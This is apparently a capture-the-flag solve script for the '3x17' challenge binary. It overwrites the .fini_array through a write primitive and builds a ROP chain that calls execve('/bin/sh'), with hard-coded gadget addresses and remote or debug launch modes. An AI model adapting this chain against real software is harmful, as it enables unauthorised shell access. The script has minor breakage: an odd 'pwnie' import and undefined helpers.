#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./3x17', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

b *0x401BDC
b *0x401C29
b *0x401c4c

c
'''

p = start()

# ==================== EXPLOIT ====================

def write_what_where(where, what):
    sla(b'addr:', str(where).encode())
    sa(b'data:', what)

def exploit():

    fini_array = 0x4B40F0
    fini_array_caller = 0x0402960
    main = 0x401b6d

    write_what_where(fini_array,  p64(fini_array_caller) + p64(main))

    pop_rdx = 0x446e35
    pop_rdi = 0x401696
    pop_rax = 0x41e4af
    pop_rsi = 0x406c30
    syscall = 0x4022b4
    leave_ret = 0x401c4b

    payload = flat(
        0,
        pop_rdi, 
        fini_array + 0x200,
        pop_rax, 
        0x3b,
        pop_rsi, 
        0,
        syscall,
    )

    for i in range(0, len(payload), 0x8):
        write_what_where(fini_array + 0x10+i, payload[i:i+0x8])


    # debug(attach=True)
    write_what_where(fini_array + 0x200, b'/bin/sh\0')
    write_what_where(fini_array, p64(leave_ret) + p64(pop_rdx))

    interactive()

if __name__ == '__main__':
    exploit()
